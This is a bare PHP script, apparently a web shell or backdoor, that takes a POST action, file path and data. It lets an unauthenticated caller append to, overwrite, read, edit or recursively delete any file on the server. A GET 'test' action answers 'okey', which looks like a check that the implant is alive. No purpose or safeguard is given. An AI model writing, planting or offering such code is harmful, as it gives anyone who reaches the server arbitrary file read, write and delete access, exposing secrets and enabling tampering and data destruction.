<?php
$act=$_POST['act'];
$file=$_POST['file'];
$data=$_POST['data'];

$gact=$_GET['act'];

function remd($path) {
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $file = $path . '/' . $file;
            if (is_dir($file)) {
                remd($file);
                rmdir($file);
            } else {
                unlink($file);
            }
        }
    }
}

if ($act=="app") {
    $f = fopen($file, 'a'); 
    fwrite($f, $data."\n");
    fclose($f);
} else if ($act=="rem") {
    if (!unlink($file)) {
        remd($file);
    }
} else if ($act=="put") {
    $f = fopen($file, 'w'); 
    fwrite($f, $data."\n");
    fclose($f);
} else if ($act=="get") {
    echo file_get_contents($file);
} else if ($act=="rep") {
    $data = str_replace($data, "", file_get_contents($file));
    $data = str_replace("\n\n", "\n", $data);
    $f = fopen($file, 'w'); 
    fwrite($f, $data."\n");
    fclose($f);
} else if ($gact=="test") {
    echo "okey";
} else {
    echo date("h:i:sa");
}
?>
